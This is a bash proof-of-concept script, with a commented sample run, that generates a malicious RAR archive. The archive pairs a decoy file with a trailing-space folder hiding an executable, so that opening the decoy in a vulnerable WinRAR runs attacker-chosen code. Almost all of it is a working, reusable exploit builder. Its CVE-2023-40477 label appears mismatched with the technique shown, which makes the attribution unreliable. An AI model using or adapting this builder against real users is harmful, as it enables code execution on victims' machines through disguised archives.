#!/bin/bash
# CVE-2023-40477 (below 6.23 version) WinRar Poc

# mac@workpc CVE-2023-40477 % ls
# CVE-2023-40477.sh       readme.txt              run.cmd
# mac@workpc CVE-2023-40477 % cat readme.txt 
# Hello, world
# mac@workpc CVE-2023-40477 % cat run.cmd 
# calc
# mac@workpc CVE-2023-40477 % ./CVE-2023-40477.sh poc.rar run.cmd readme.txt

# RAR 6.23   Copyright (c) 1993-2023 Alexander Roshal   1 Aug 2023
# Trial version             Type 'rar -?' for help

# Evaluation copy. Please register.

# Creating archive poc.rar

# Adding    readme.txt /readme.txt .cmd                                 OK 
# Adding    foobar.tmp                                                  OK 
# Adding    readme.txt                                                  OK 
# Done

# RAR 6.23   Copyright (c) 1993-2023 Alexander Roshal   1 Aug 2023
# Trial version             Type 'rar -?' for help


# Processing archive poc.rar
# Renaming foobar.tmp to readme.txt 
# Done

# RAR 6.23   Copyright (c) 1993-2023 Alexander Roshal   1 Aug 2023
# Trial version             Type 'rar -?' for help

# Archive: poc.rar
# Details: RAR 5

#  Attributes      Size     Date    Time   Name
# ----------- ---------  ---------- -----  ----
#  -rw-r--r--         5  2023-08-28 16:03  readme.txt /readme.txt .cmd
#  -rw-r--r--        13  2023-08-28 16:03  readme.txt 
#  drwxr-xr-x         0  2023-08-28 16:03  readme.txt 
# ----------- ---------  ---------- -----  ----
#                    18                    3

# mac@workpc CVE-2023-40477 % ls
# CVE-2023-40477.sh       poc.rar                 readme.txt              run.cmd

# check arguments and show usage
if [ $# -lt 3 ]; then
    echo "insufficient arguments"
    echo "Usage: $0 <archivename> <executable file> <embeded file> [password]"
    echo "Example: $0 poc.rar run.cmd readme.txt"
    exit 1
fi

# Assign arguments to variables
archivename=$1
executable=$2
embededfile=$3
password=$4
extension="${executable##*.}"

if [ -n "$password" ]; then
    password="-p$password"
fi

echo $password
#exit
# clean & create directories
tempworkplace=".tmp"
rm -rf $tempworkplace
rm -rf $archivename
mkdir -p "$tempworkplace/$embededfile "
cp $executable "$tempworkplace/$embededfile /$embededfile .$extension"
cp $embededfile $tempworkplace/foobar.tmp
cd $tempworkplace
rar a -r $password $archivename $embededfile\  foobar.tmp
rar rn $password $archivename foobar.tmp "$embededfile "
cd ..
mv $tempworkplace/$archivename .
rm -rf $tempworkplace
rar l $archivename

